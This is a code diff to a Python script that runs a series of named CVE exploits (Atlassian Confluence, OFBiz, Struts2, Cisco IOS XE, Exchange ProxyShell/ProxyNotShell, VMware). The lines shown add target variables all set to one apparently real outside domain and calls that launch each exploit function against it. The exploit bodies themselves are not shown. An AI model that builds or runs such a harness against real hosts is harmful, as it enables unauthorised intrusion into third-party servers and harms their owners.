@@ -122,6 +122,8 @@ def exploit_cve_2017_5638(target_url):
     except Exception as e:
         print(f"[!] Error occurred: {e}")
 
+        
+
 def exploit_cve_2022_41082(target_url):
     """
     CVE-2022-41082 Exploit (Exchange Server RCE via /powershell endpoint)
@@ -216,41 +218,68 @@ if __name__ == "__main__":
     cve_2021_26084_target = "http://mirteam.kr"
     cve_2023_51467_target = "http://mirteam.kr"
     cve_2017_5638_target = "http://mirteam.kr"
+    cve_2019_1653_target = "http://mirteam.kr"
+    cve_2023_20198_target = "http://mirteam.kr"
+    cve_2023_20273_target = "http://mirteam.kr"
+    cve_2021_34473_target = "http://mirteam.kr"
     cve_2022_41082_target = "http://mirteam.kr"
     cve_2022_22954_target = "http://mirteam.kr"
     cve_2022_22972_target = "http://mirteam.kr"
-    #cve_2021_34473_target
+
 
     # Start point messages
     print("\n[*] Categorization Atlassian Exploit...")
     print("\n[*] Attempting CVE-2022-26134 Exploit...")
     exploit_cve_2022_26134(cve_2022_26134_target)
+
+    print("\n[*] -----------------------------------")
     
     print("\n[*] Attempting CVE-2021-26084 Exploit...")
     exploit_cve_2021_26084(cve_2021_26084_target)
+
+    print("\n[*] -----------------------------------")
     
     print("\n[*] Categorization OFBiz Exploit...")
     print("\n[*] Attempting CVE-2023-51467 Exploit...")
     exploit_cve_2023_51467(cve_2023_51467_target)
 
+    print("\n[*] -----------------------------------")
+
     print("\n[*] Categorization Struts2 Exploit...")
     print("\n[*] Attempting CVE-2017-5638 Exploit...")
     exploit_cve_2017_5638(cve_2017_5638_target)
     
+    print("\n[*] -----------------------------------")
+
     print("\n[*] Categorization Cisco Exploit...")
+    print("\n[*] Attempting CVE-2019-1653 Exploit...")
+    exploit_cve_2019_1653(cve_2019_1653_target)
+    print("\n[*] Attempting CVE-2023-20198 Exploit...")
+    exploit_cve_2023_20198(cve_2023_20198_target)
+    print("\n[*] Attempting CVE-2023-20198 Exploit...")
+    exploit_cve_2023_20273(cve_2023_20273_target)
+
+    print("\n[*] -----------------------------------")
 
     print("\n[*] Categorization Citrix Bleed Exploit...")
+
+    print("\n[*] -----------------------------------")
 
     print("\n[*] Categorization ProxyShell Exploit...")
     print("\n[*] Attempting CVE-2021-34473 Exploit...")
     exploit_cve_2022_41082(cve_2021_34473_target)
 
+    print("\n[*] -----------------------------------")
+
     print("\n[*] Categorization ProxyNotShell Exploit...")
     print("\n[*] Attempting CVE-2022-41082 Exploit...")
     exploit_cve_2022_41082(cve_2022_41082_target)
 
+    print("\n[*] -----------------------------------")
+
     print("\n[*] Categorization ShellShock Exploit...")
 
+    print("\n[*] -----------------------------------")
 
     print("\n[*] Categorization vmware Exploit...")
     print("\n[*] Attempting CVE-2022-22954 Exploit...")
